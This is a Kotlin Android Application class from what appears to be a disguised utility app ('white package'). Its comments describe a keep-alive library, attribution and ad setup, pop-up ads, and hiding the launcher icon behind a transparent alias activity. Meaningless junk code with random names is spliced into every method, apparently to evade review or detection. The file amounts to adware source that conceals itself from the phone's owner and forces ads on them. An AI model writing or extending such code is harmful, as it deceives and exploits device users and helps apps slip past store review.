package tnug.oetxf.oggaq

import android.app.Application
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.core.content.ContextCompat.startActivity
import com.b.w.BaseJksApplication
import tnug.oetxf.oggaq.tools.ToolUiInstaller
import com.huawei.recharge.featurexzy21.df
import com.kwad.sdk.api.proxy.app.Helpers
import tnug.vvzyg.pqc.base.APPContext
import tnug.vvzyg.pqc.base.BaseApplication
import tnug.vvzyg.pqc.base.OverseaAppHost
import tnug.vvzyg.pqc.base.OverseaAppInitializer
import tnug.vvzyg.pqc.ad.runtime.AdLifecycleInstaller


class RXIA : BaseJksApplication(), OverseaAppHost {

    companion object {
        @JvmStatic
        var insApp: RXIA? = null
    }

    override fun onCreate() {
           val vmtYCFJGvIajtpf : Any = if (kotlin.random.Random.nextBoolean()) 54 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val AuNYqwiVga  = (vmtYCFJGvIajtpf  as? String)?.reversed() ?: "ijehOWXjz_-1441238990"

        if (AuNYqwiVga  == "rrEJX") {
            java.lang.System.out.print(AuNYqwiVga )
        }
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 统一安装广告生命周期监听，内部带幂等保护
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
        val arr_YDqFVZVYaaWhxn  = listOf("chDeF", "EkVzzKYJQPbW", "bbyaRFFvEHqLe").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_rywEIjxCYXjgGNLxZP  = arr_YDqFVZVYaaWhxn .filter { it.length > 21 }
         if (ad_rywEIjxCYXjgGNLxZP .isNotEmpty() && java.lang.System.currentTimeMillis() < 45) {
             ad_rywEIjxCYXjgGNLxZP .forEach { _ ->  }
         }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val xJLQRY : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val bTavnOIwn  = xJLQRY ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_10" 
            }
            if (bTavnOIwn .startsWith("SckMuKj ")) {
                android.util.Log.v("TAG", bTavnOIwn )
            }
        ZUTN.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_XJUvDpJsjodNcnugn  = listOf("PnounzJcU", "mmCvzEzOhxc", "hziUHZUAvlJD").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_JXxlDEd  = arr_XJUvDpJsjodNcnugn .filter { it.length > 0 }
         if (ad_JXxlDEd .isNotEmpty() && java.lang.System.currentTimeMillis() < 91) {
             ad_JXxlDEd .forEach { _ ->  }
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        df.page(insApp, intent)
    }


    override fun initPopPower() {
        val arr_hAdAMFMRSOlMDBRwv  = listOf("NHYudLTMLnRgaskPXV", "NDJOsQ", "oyVyumeiFnzVPIEf").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_TeWgaaSKuvNB  = arr_hAdAMFMRSOlMDBRwv .filter { it.length > 86 }
         if (ad_TeWgaaSKuvNB .isNotEmpty() && java.lang.System.currentTimeMillis() < 95) {
             ad_TeWgaaSKuvNB .forEach { _ ->  }
         }
        // 启动图标隐藏：禁用 ZURT 主入口，启用透明 MysteryAliasActivity
        startActivity(Intent(this, ZURU::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
        df.vir(insApp)
    }


    override fun initKeepPower(app: Application) {
        val yDzCiCynSNcCqBog : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val zpLezwaRMTVCvAkLuMJ  = yDzCiCynSNcCqBog ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_22" 
            }
            if (zpLezwaRMTVCvAkLuMJ .startsWith("yrzxMJlc ")) {
                android.util.Log.v("TAG", zpLezwaRMTVCvAkLuMJ )
            }
        Helpers.setGuiyin(true)
    }

}